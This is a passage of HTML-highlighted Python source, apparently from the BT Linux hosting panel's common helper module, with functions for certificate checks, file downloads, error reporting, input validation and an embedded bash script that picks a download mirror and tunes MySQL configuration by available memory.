class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = result.encode(<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>).decode(<span class="string">&quot;utf-8&quot;</span>,errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result.strip()</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#验证证书</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckCert</span>(<span class="params">certPath = <span class="string">&#x27;ssl/certificate.pem&#x27;</span></span>):</span><br><span class="line">    openssl = <span class="string">&#x27;/usr/local/openssl/bin/openssl&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(openssl): openssl = <span class="string">&#x27;openssl&#x27;</span></span><br><span class="line">    certPem = readFile(certPath)</span><br><span class="line">    s = <span class="string">&quot;\n-----BEGIN CERTIFICATE-----&quot;</span></span><br><span class="line">    tmp = certPem.strip().split(s)</span><br><span class="line">    <span class="keyword">for</span> tmp1 <span class="keyword">in</span> tmp:</span><br><span class="line">        <span class="keyword">if</span> tmp1.find(<span class="string">&#x27;-----BEGIN CERTIFICATE-----&#x27;</span>) == -<span class="number">1</span>:  tmp1 = s + tmp1</span><br><span class="line">        writeFile(certPath,tmp1)</span><br><span class="line">        result = ExecShell(openssl + <span class="string">&quot; x509 -in &quot;</span>+certPath+<span class="string">&quot; -noout -subject&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>].find(<span class="string">&#x27;-bash:&#x27;</span>) != -<span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result[<span class="number">1</span>]) &gt; <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">0</span>].find(<span class="string">&#x27;error:&#x27;</span>) != -<span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取面板地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPanelAddr</span>():</span><br><span class="line">    <span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">    protocol = <span class="string">&#x27;https://&#x27;</span> <span class="keyword">if</span> os.path.exists(<span class="string">&quot;data/ssl.pl&quot;</span>) <span class="keyword">else</span> <span class="string">&#x27;http://&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> protocol + request.headers.get(<span class="string">&#x27;host&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#字节单位转换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_size</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> size: <span class="keyword">return</span> <span class="string">&#x27;0.00 b&#x27;</span></span><br><span class="line">    size = <span class="built_in">float</span>(size)</span><br><span class="line">    d = (<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;KB&#x27;</span>,<span class="string">&#x27;MB&#x27;</span>,<span class="string">&#x27;GB&#x27;</span>,<span class="string">&#x27;TB&#x27;</span>)</span><br><span class="line">    s = d[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> d:</span><br><span class="line">        <span class="keyword">if</span> size &lt; <span class="number">1024</span>: <span class="keyword">return</span> (<span class="string">&quot;%.2f&quot;</span> % size) + <span class="string">&#x27; &#x27;</span> + b</span><br><span class="line">        size = size / <span class="number">1024</span></span><br><span class="line">        s = b</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&quot;%.2f&quot;</span> % size) + <span class="string">&#x27; &#x27;</span> + b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkCode</span>(<span class="params">code,outime = <span class="number">120</span></span>):</span><br><span class="line">    <span class="comment">#校验验证码</span></span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> session,cache</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        codeStr = cache.get(<span class="string">&#x27;codeStr&#x27;</span>)</span><br><span class="line">        cache.delete(<span class="string">&#x27;codeStr&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> codeStr:</span><br><span class="line">            session[<span class="string">&#x27;login_error&#x27;</span>] = GetMsg(<span class="string">&#x27;CODE_TIMEOUT&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> md5(code.lower()) != codeStr:</span><br><span class="line">            session[<span class="string">&#x27;login_error&#x27;</span>] = GetMsg(<span class="string">&#x27;CODE_ERR&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        session[<span class="string">&#x27;login_error&#x27;</span>] = GetMsg(<span class="string">&#x27;CODE_NOT_EXISTS&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写进度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeSpeed</span>(<span class="params">title,used,total,speed = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">import</span> json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> title:</span><br><span class="line">        data = &#123;<span class="string">&#x27;title&#x27;</span>:<span class="literal">None</span>,<span class="string">&#x27;progress&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;total&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;used&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        progress = <span class="built_in">int</span>((<span class="number">100.0</span> * used / total))</span><br><span class="line">        data = &#123;<span class="string">&#x27;title&#x27;</span>:title,<span class="string">&#x27;progress&#x27;</span>:progress,<span class="string">&#x27;total&#x27;</span>:total,<span class="string">&#x27;used&#x27;</span>:used,<span class="string">&#x27;speed&#x27;</span>:speed&#125;</span><br><span class="line">    writeFile(<span class="string">&#x27;/tmp/panelSpeed.pl&#x27;</span>,json.dumps(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#取进度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpeed</span>():</span><br><span class="line">    <span class="keyword">import</span> json;</span><br><span class="line">    data = readFile(<span class="string">&#x27;/tmp/panelSpeed.pl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        data = json.dumps(&#123;<span class="string">&#x27;title&#x27;</span>:<span class="literal">None</span>,<span class="string">&#x27;progress&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;total&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;used&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line">        writeFile(<span class="string">&#x27;/tmp/panelSpeed.pl&#x27;</span>,data)</span><br><span class="line">    <span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloadFile</span>(<span class="params">url,filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">import</span> urllib</span><br><span class="line">            urllib.urlretrieve(url,filename=filename ,reporthook= downloadHook)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">import</span> urllib.request</span><br><span class="line">            urllib.request.urlretrieve(url,filename=filename ,reporthook= downloadHook)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloadHook</span>(<span class="params">count, blockSize, totalSize</span>):</span><br><span class="line">    speed = &#123;<span class="string">&#x27;total&#x27;</span>:totalSize,<span class="string">&#x27;block&#x27;</span>:blockSize,<span class="string">&#x27;count&#x27;</span>:count&#125;</span><br><span class="line">    <span class="comment">#print(&#x27;%02d%%&#x27;%(100.0 * count * blockSize / totalSize))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_error_info</span>():</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    errorMsg = traceback.format_exc()</span><br><span class="line">    <span class="keyword">return</span> errorMsg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_error</span>(<span class="params">err_msg = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/www/server/panel/not_submit_errinfo.pl&#x27;</span>): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">from</span> BTPanel <span class="keyword">import</span> request</span><br><span class="line">        <span class="keyword">import</span> system</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> err_msg: err_msg = get_error_info()</span><br><span class="line">        pdata = &#123;&#125;</span><br><span class="line">        pdata[<span class="string">&#x27;err_info&#x27;</span>] = err_msg</span><br><span class="line">        pdata[<span class="string">&#x27;path_full&#x27;</span>] = request.full_path</span><br><span class="line">        pdata[<span class="string">&#x27;version&#x27;</span>] = <span class="string">&#x27;Linux-Panel-%s&#x27;</span> % version()</span><br><span class="line">        pdata[<span class="string">&#x27;os&#x27;</span>] = system.system().GetSystemVersion()</span><br><span class="line">        pdata[<span class="string">&#x27;py_version&#x27;</span>] = sys.version</span><br><span class="line">        pdata[<span class="string">&#x27;install_date&#x27;</span>] = <span class="built_in">int</span>(os.stat(<span class="string">&#x27;/www/server/panel/class/common.py&#x27;</span>).st_mtime)</span><br><span class="line">        httpPost(<span class="string">&quot;http://www.bt.cn/api/panel/s_error&quot;</span>,pdata,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索数据中是否存在</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inArray</span>(<span class="params">arrays,searchStr</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> arrays:</span><br><span class="line">        <span class="keyword">if</span> key == searchStr: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#格式化指定时间戳</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_date</span>(<span class="params"><span class="built_in">format</span>=<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,times = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> times: times = <span class="built_in">int</span>(time.time())</span><br><span class="line">    time_local = time.localtime(times)</span><br><span class="line">    <span class="keyword">return</span> time.strftime(<span class="built_in">format</span>, time_local)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查Web服务器配置文件是否有错误</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkWebConfig</span>():</span><br><span class="line">    f1 = <span class="string">&#x27;/www/server/panel/vhost/&#x27;</span></span><br><span class="line">    f2 = <span class="string">&#x27;/www/server/panel/plugin/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(f2 + <span class="string">&#x27;btwaf&#x27;</span>):</span><br><span class="line">        f3 = f1 + <span class="string">&#x27;nginx/btwaf.conf&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(f3): os.remove(f3)</span><br><span class="line">    <span class="comment"># if not os.path.exists(f2 + &#x27;btwaf_httpd&#x27;):</span></span><br><span class="line">    <span class="comment">#     f3 = f1 + &#x27;apache/btwaf.conf&#x27;</span></span><br><span class="line">    <span class="comment">#     if os.path.exists(f3): os.remove(f3)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(f2 + <span class="string">&#x27;total&#x27;</span>):</span><br><span class="line">        f3 = f1 + <span class="string">&#x27;apache/total.conf&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(f3): os.remove(f3)</span><br><span class="line">        f3 = f1 + <span class="string">&#x27;nginx/total.conf&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(f3): os.remove(f3)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/www/server/apache/modules/mod_lua.so&#x27;</span>):</span><br><span class="line">            writeFile(f1 + <span class="string">&#x27;apache/btwaf.conf&#x27;</span>,<span class="string">&#x27;LoadModule lua_module modules/mod_lua.so&#x27;</span>)</span><br><span class="line">            writeFile(f1 + <span class="string">&#x27;apache/total.conf&#x27;</span>,<span class="string">&#x27;LuaHookLog /www/server/total/httpd_log.lua run_logs&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f3 = f1 + <span class="string">&#x27;apache/total.conf&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(f3): os.remove(f3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> get_webserver() == <span class="string">&#x27;nginx&#x27;</span>:</span><br><span class="line">        result = ExecShell(<span class="string">&quot;ulimit -n 8192 ; /www/server/nginx/sbin/nginx -t -c /www/server/nginx/conf/nginx.conf&quot;</span>)</span><br><span class="line">        searchStr = <span class="string">&#x27;successful&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> get_webserver() == <span class="string">&#x27;apache&#x27;</span>:</span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">        result = ExecShell(<span class="string">&quot;ulimit -n 8192 ; /www/server/apache/bin/apachectl -t&quot;</span>)</span><br><span class="line">        searchStr = <span class="string">&#x27;Syntax OK&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = [<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>]</span><br><span class="line">        searchStr = <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">if</span> result[<span class="number">1</span>].find(searchStr) == -<span class="number">1</span>:</span><br><span class="line">        WriteLog(<span class="string">&quot;TYPE_SOFT&quot;</span>, <span class="string">&#x27;CONF_CHECK_ERR&#x27;</span>,(result[<span class="number">1</span>],))</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查是否为IPv4地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkIp</span>(<span class="params">ip</span>):</span><br><span class="line">    p = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.)&#123;3&#125;(25[0-5]|2[0-4]\d|[01]?\d\d?)$&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> p.<span class="keyword">match</span>(ip):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查端口是否合法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkPort</span>(<span class="params">port</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">&quot;^\d+$&quot;</span>,port): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ports = [<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;443&#x27;</span>,<span class="string">&#x27;8080&#x27;</span>,<span class="string">&#x27;888&#x27;</span>,<span class="string">&#x27;8888&#x27;</span>,<span class="string">&#x27;8443&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> port <span class="keyword">in</span> ports: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    intport = <span class="built_in">int</span>(port)</span><br><span class="line">    <span class="keyword">if</span> intport &lt; <span class="number">1</span> <span class="keyword">or</span> intport &gt; <span class="number">65535</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串取中间</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStrBetween</span>(<span class="params">startStr,endStr,srcStr</span>):</span><br><span class="line">    start = srcStr.find(startStr)</span><br><span class="line">    <span class="keyword">if</span> start == -<span class="number">1</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    end = srcStr.find(endStr)</span><br><span class="line">    <span class="keyword">if</span> end == -<span class="number">1</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> srcStr[start+<span class="number">1</span>:end]</span><br><span class="line"></span><br><span class="line"><span class="comment">#取CPU类型</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCpuType</span>():</span><br><span class="line">    cpuinfo = <span class="built_in">open</span>(<span class="string">&#x27;/proc/cpuinfo&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    rep = <span class="string">&quot;model\s+name\s+:\s+(.+)&quot;</span></span><br><span class="line">    tmp = re.search(rep,cpuinfo,re.I)</span><br><span class="line">    cpuType = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> tmp:</span><br><span class="line">        cpuType = tmp.groups()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cpuinfo = ExecShell(<span class="string">&#x27;LANG=&quot;en_US.UTF-8&quot; &amp;&amp; lscpu&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        rep = <span class="string">&quot;Model\s+name:\s+(.+)&quot;</span></span><br><span class="line">        tmp = re.search(rep,cpuinfo,re.I)</span><br><span class="line">        <span class="keyword">if</span> tmp: cpuType = tmp.groups()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> cpuType</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查是否允许重启</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IsRestart</span>():</span><br><span class="line">    num  = M(<span class="string">&#x27;tasks&#x27;</span>).where(<span class="string">&#x27;status!=?&#x27;</span>,(<span class="string">&#x27;1&#x27;</span>,)).count()</span><br><span class="line">    <span class="keyword">if</span> num &gt; <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#加密密码字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hasPwd</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="keyword">import</span> crypt;</span><br><span class="line">    <span class="keyword">return</span> crypt.crypt(password,password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getDate</span>(<span class="params"><span class="built_in">format</span>=<span class="string">&#x27;%Y-%m-%d %X&#x27;</span></span>):</span><br><span class="line">    <span class="comment">#取格式时间</span></span><br><span class="line">    <span class="keyword">return</span> time.strftime(<span class="built_in">format</span>,time.localtime())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#处理MySQL配置文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckMyCnf</span>():</span><br><span class="line">    <span class="keyword">import</span> os;</span><br><span class="line">    confFile = <span class="string">&#x27;/etc/my.cnf&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(confFile):</span><br><span class="line">        conf = readFile(confFile)</span><br><span class="line">        <span class="keyword">if</span> conf.find(<span class="string">&#x27;[mysqld]&#x27;</span>) != -<span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    versionFile = <span class="string">&#x27;/www/server/mysql/version.pl&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(versionFile): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    versions = [<span class="string">&#x27;5.1&#x27;</span>,<span class="string">&#x27;5.5&#x27;</span>,<span class="string">&#x27;5.6&#x27;</span>,<span class="string">&#x27;5.7&#x27;</span>,<span class="string">&#x27;8.0&#x27;</span>,<span class="string">&#x27;AliSQL&#x27;</span>]</span><br><span class="line">    version = readFile(versionFile)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> versions:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> version:</span><br><span class="line">            version = key</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    shellStr = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin</span></span><br><span class="line"><span class="string">export PATH</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CN=&#x27;125.88.182.172&#x27;</span></span><br><span class="line"><span class="string">HK=&#x27;download.bt.cn&#x27;</span></span><br><span class="line"><span class="string">HK2=&#x27;103.224.251.67&#x27;</span></span><br><span class="line"><span class="string">US=&#x27;128.1.164.196&#x27;</span></span><br><span class="line"><span class="string">sleep 0.5;</span></span><br><span class="line"><span class="string">CN_PING=`ping -c 1 -w 1 $CN|grep time=|awk &#x27;&#123;print $7&#125;&#x27;|sed &quot;s/time=//&quot;`</span></span><br><span class="line"><span class="string">HK_PING=`ping -c 1 -w 1 $HK|grep time=|awk &#x27;&#123;print $7&#125;&#x27;|sed &quot;s/time=//&quot;`</span></span><br><span class="line"><span class="string">HK2_PING=`ping -c 1 -w 1 $HK2|grep time=|awk &#x27;&#123;print $7&#125;&#x27;|sed &quot;s/time=//&quot;`</span></span><br><span class="line"><span class="string">US_PING=`ping -c 1 -w 1 $US|grep time=|awk &#x27;&#123;print $7&#125;&#x27;|sed &quot;s/time=//&quot;`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo &quot;$HK_PING $HK&quot; &gt; ping.pl</span></span><br><span class="line"><span class="string">echo &quot;$HK2_PING $HK2&quot; &gt;&gt; ping.pl</span></span><br><span class="line"><span class="string">echo &quot;$US_PING $US&quot; &gt;&gt; ping.pl</span></span><br><span class="line"><span class="string">echo &quot;$CN_PING $CN&quot; &gt;&gt; ping.pl</span></span><br><span class="line"><span class="string">nodeAddr=`sort -V ping.pl|sed -n &#x27;1p&#x27;|awk &#x27;&#123;print $2&#125;&#x27;`</span></span><br><span class="line"><span class="string">if [ &quot;$nodeAddr&quot; == &quot;&quot; ];then</span></span><br><span class="line"><span class="string">    nodeAddr=$HK</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Download_Url=http://$nodeAddr:5880</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MySQL_Opt()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    MemTotal=`free -m | grep Mem | awk &#x27;&#123;print  $2&#125;&#x27;`</span></span><br><span class="line"><span class="string">    if [[ $&#123;MemTotal&#125; -gt 1024 &amp;&amp; $&#123;MemTotal&#125; -lt 2048 ]]; then</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^key_buffer_size.*#key_buffer_size = 32M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^table_open_cache.*#table_open_cache = 128#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^sort_buffer_size.*#sort_buffer_size = 768K#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^read_buffer_size.*#read_buffer_size = 768K#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^myisam_sort_buffer_size.*#myisam_sort_buffer_size = 8M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^thread_cache_size.*#thread_cache_size = 16#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^query_cache_size.*#query_cache_size = 16M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^tmp_table_size.*#tmp_table_size = 32M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_buffer_pool_size.*#innodb_buffer_pool_size = 128M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_log_file_size.*#innodb_log_file_size = 32M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">    elif [[ $&#123;MemTotal&#125; -ge 2048 &amp;&amp; $&#123;MemTotal&#125; -lt 4096 ]]; then</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^key_buffer_size.*#key_buffer_size = 64M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^table_open_cache.*#table_open_cache = 256#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^sort_buffer_size.*#sort_buffer_size = 1M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^read_buffer_size.*#read_buffer_size = 1M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^myisam_sort_buffer_size.*#myisam_sort_buffer_size = 16M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^thread_cache_size.*#thread_cache_size = 32#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^query_cache_size.*#query_cache_size = 32M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^tmp_table_size.*#tmp_table_size = 64M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_buffer_pool_size.*#innodb_buffer_pool_size = 256M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_log_file_size.*#innodb_log_file_size = 64M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">    elif [[ $&#123;MemTotal&#125; -ge 4096 &amp;&amp; $&#123;MemTotal&#125; -lt 8192 ]]; then</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^key_buffer_size.*#key_buffer_size = 128M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^table_open_cache.*#table_open_cache = 512#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^sort_buffer_size.*#sort_buffer_size = 2M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^read_buffer_size.*#read_buffer_size = 2M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^myisam_sort_buffer_size.*#myisam_sort_buffer_size = 32M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^thread_cache_size.*#thread_cache_size = 64#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^query_cache_size.*#query_cache_size = 64M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^tmp_table_size.*#tmp_table_size = 64M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_buffer_pool_size.*#innodb_buffer_pool_size = 512M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_log_file_size.*#innodb_log_file_size = 128M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">    elif [[ $&#123;MemTotal&#125; -ge 8192 &amp;&amp; $&#123;MemTotal&#125; -lt 16384 ]]; then</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^key_buffer_size.*#key_buffer_size = 256M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^table_open_cache.*#table_open_cache = 1024#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^sort_buffer_size.*#sort_buffer_size = 4M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^read_buffer_size.*#read_buffer_size = 4M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^myisam_sort_buffer_size.*#myisam_sort_buffer_size = 64M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^thread_cache_size.*#thread_cache_size = 128#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^query_cache_size.*#query_cache_size = 128M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^tmp_table_size.*#tmp_table_size = 128M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i 